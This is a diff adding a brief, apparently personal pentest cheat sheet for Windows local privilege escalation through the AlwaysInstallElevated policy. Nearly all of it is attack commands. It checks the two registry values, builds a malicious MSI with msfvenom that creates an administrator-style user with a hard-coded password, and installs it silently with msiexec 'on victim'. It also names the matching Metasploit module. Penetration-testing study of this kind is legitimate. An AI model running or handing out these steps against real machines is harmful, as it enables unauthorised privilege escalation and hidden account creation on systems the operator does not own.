@@ -1,0 +1,16 @@
+# Check if these 2 registry value is -> 0x1
+
+--> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+--> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# if yes, create malicious file
+
+--> msfvenom -p windows/adduser USER=aman PASS=aman123 -f msi -o file.msi
+
+# execute your file on victim
+
+--> msiexec /quiet /qn /i C:\file.msi
+
+# or use metasploit module
+
+--> use exploit/windows/local/always_install_elevated
